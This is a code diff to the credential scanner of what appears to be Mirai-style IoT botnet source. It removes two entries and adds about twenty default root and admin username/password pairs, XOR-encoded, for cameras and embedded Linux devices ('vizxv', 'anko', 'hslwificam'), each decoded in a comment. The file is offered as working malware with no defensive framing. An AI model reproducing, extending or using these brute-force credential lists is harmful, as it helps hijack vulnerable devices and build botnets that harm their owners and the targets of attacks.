@@ -205,8 +205,6 @@ void scanner_init(void)
     add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x52\x50\x4B\x5C\x41\x47\x51\x51", 1);          // admin    princess
     add_auth_entry("\x50\x4D\x4D\x56", "\x13\x10\x11\x16\x17\x14\x15", 1);                  // root     1234567
     add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x13\x10\x11\x16\x17\x14\x15", 1);              // admin    1234567
-    add_auth_entry("\x50\x4D\x4D\x56", "\x50\x4D\x41\x49\x5B\x4D\x57", 1);                  // root     rockyou
-    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x50\x4D\x41\x49\x5B\x4D\x57", 1);              // admin    rockyou
     add_auth_entry("\x50\x4D\x4D\x56", "\x44\x57\x41\x49\x5B\x4D\x57", 1);                  // root     fuckyou
     add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x44\x57\x41\x49\x5B\x4D\x57", 1);              // admin    fuckyou
     add_auth_entry("\x43\x46\x4F\x4B\x5C\x43\x46\x4F\x4B\x5C", "\x43\x46\x4F\x4B\x5C\x43\x46\x4F\x4B\x5C", 1); // adminadmin    adminadmin
@@ -222,6 +220,25 @@ void scanner_init(void)
     add_auth_entry("\x50\x4D\x4D\x56", "\x11\x12\x4F\x47\x46\x4B\x43", 1);                  // root     30media
     add_auth_entry("\x50\x4D\x4D\x56", "\x44\x57\x41\x49\x14\x14\x14", 1);                  // root     fuck666
     add_auth_entry("\x50\x4D\x4D\x56", "\x44\x57\x41\x49\x4B\x5C\x45", 1);                  // root     fucking
+    add_auth_entry("\x50\x4D\x4D\x56", "\x4A\x51\x4E\x55\x4B\x44\x4B\x41\x43\x4F", 1);      // root     hslwificam
+    add_auth_entry("\x50\x4D\x4D\x56", "\x4A\x4B\x41\x4A\x4B\x52\x4A\x5A", 1);              // root     hichiphx
+    add_auth_entry("\x50\x4D\x4D\x56", "\x4F\x4D\x58\x43\x50\x56", 1);                      // root     mozart
+    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x40\x4E\x43\x5C\x49", 1);                      // admin    blank
+    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x41\x43\x5C\x4D\x5C", 1);                      // admin    canon
+    add_auth_entry("\x50\x4D\x4D\x56", "\x41\x43\x4E\x54\x4B\x5C", 1);                      // root     calvin
+    add_auth_entry("\x50\x4D\x4D\x56", "\x44\x4B\x46\x47\x4E\x13\x10\x11", 1);              // root     fidel123
+    add_auth_entry("\x50\x4D\x4D\x56", "\x56\x4B\x4F\x47\x51\x47\x50\x54\x47\x50", 1);      // root     timeserver
+    add_auth_entry("\x50\x4D\x4D\x56", "\x54\x4B\x58\x5A\x54", 1);                          // root     vizxv
+    add_auth_entry("\x50\x4D\x4D\x56", "\x43\x5C\x49\x4D", 1);                              // root     anko
+    add_auth_entry("\x50\x4D\x4D\x56", "\x4D\x47\x4E\x4B\x5C\x57\x5A\x13\x10\x11", 1);      // root     oelinux123
+    add_auth_entry("\x50\x4D\x4D\x56", "\x41\x5A\x4E\x4B\x5C\x57\x5A", 1);                  // root     cxlinux
+    add_auth_entry("\x50\x4D\x4D\x56", "\x13\x12\x12\x13\x41\x4A\x4B\x5C", 1);              // root     1001chin
+    add_auth_entry("\x50\x4D\x4D\x56", "\x50\x4D\x4D\x56\x13\x10\x14", 1);                  // root     root126
+    add_auth_entry("\x50\x4D\x4D\x56", "\x50\x4D\x4D\x56\x52\x43\x51\x51\x55\x46", 1);      // root     rootpasswd
+    add_auth_entry("\x50\x4D\x4D\x56", "\x52\x43\x51\x51", 1);                              // root     pass
+    add_auth_entry("\x50\x4D\x4D\x56", "\x4E\x4B\x5C\x57\x5A", 1);                          // root     linux
+    add_auth_entry("\x50\x4D\x4D\x56", "\x17\x57\x52", 1);                                  // root     5up
+    add_auth_entry("\x43\x4F\x5A", "\x52\x43\x51\x51\x55\x4D\x50\x46", 1);                  // amx      password
 //#endif
     //--------  End Add new password  ------------
 
